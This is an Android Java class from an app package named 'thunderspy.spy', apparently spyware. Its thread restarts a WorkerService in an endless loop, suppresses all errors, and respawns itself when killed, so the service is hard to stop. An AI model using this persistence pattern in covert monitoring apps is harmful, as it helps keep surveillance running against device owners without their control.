package com.thunderspy.spy.utils;

import android.content.Context;
import android.content.Intent;
import android.widget.Toast;
import android.os.Handler;

import com.thunderspy.spy.MonitorService;
import com.thunderspy.spy.WorkerService;
import com.thunderspy.spy.utils.etp.ETPThread;

/**
 * Created by ariyan on 2/15/17.
 */

public final class MonitorServiceThread extends Thread {

    private static MonitorServiceThread monitorServiceThread = null;
    private static final Object MONITOR_SERVICE_THREAD_MUTEX = new Object();

    @Override
    public void run() {
        try {
            Utils.log("MonitorServiceThread is started");
            Context applicationContext = ApplicationContextManager.getApplicationContext();
            while (true) {
                try {
                    applicationContext.startService(new Intent(applicationContext, WorkerService.class));
                    Thread.sleep(Constants.INTERVAL_FOR_NEXT_START_SERVICE_MONITOR_SERVICE);
                } catch (Exception exp) {
                    try {
                        Thread.interrupted();
                    } catch (Exception exp1){}
                }
            }
        } catch (Exception exp) {
            Utils.log("MonitorServiceThread Error: %s", exp.getMessage());
            synchronized (MONITOR_SERVICE_THREAD_MUTEX) {
                monitorServiceThread = null;
            }
            setupMonitorServiceThread();
        }
    }

    public static void setupMonitorServiceThread() {
        try {
            synchronized (MONITOR_SERVICE_THREAD_MUTEX) {
                if(monitorServiceThread == null || !monitorServiceThread.isAlive()) {
                    monitorServiceThread = new MonitorServiceThread();
                    monitorServiceThread.start();
                } else {
                    Utils.log("MonitorServiceThread is already running");
                }
            }
        } catch (Exception exp) {
            Utils.log("MonitorServiceThread Error: %s", exp.getMessage());
        }
    }

}
